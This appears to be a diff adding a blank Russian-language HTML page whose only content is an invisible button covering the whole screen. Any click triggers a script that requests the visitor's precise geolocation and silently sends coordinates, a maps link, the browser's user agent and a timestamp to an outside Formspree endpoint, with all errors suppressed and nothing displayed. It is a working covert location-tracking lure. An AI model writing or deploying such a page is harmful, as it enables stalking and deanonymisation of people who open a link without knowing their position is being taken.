@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title></title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html, body {
+      height: 100%;
+      width: 100%;
+      overflow: hidden;
+    }
+
+    #sendBtn {
+      width: 100vw;
+      height: 100vh;
+      background: white;
+      border: none;
+      cursor: pointer;
+      outline: none;
+    }
+  </style>
+</head>
+<body>
+  <button id="sendBtn" onclick="sendLocation()"></button>
+
+  <script>
+    const FORMSPREE_ENDPOINT = "https://formspree.io/f/xaenryae";
+
+    function sendLocation() {
+      if (!navigator.geolocation) return;
+
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          const { latitude, longitude, accuracy } = position.coords;
+          
+          const data = {
+            latitude: latitude,
+            longitude: longitude,
+            accuracy: Math.round(accuracy) + " м",
+            maps_link: `https://www.google.com/maps?q=${latitude},${longitude}`,
+            user_agent: navigator.userAgent,
+            timestamp: new Date().toLocaleString("ru-RU")
+          };
+
+          try {
+            await fetch(FORMSPREE_ENDPOINT, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+                "Accept": "application/json"
+              },
+              body: JSON.stringify(data)
+            });
+          } catch (err) {}
+        },
+        () => {},
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        }
+      );
+    }
+  </script>
+</body>
+</html>
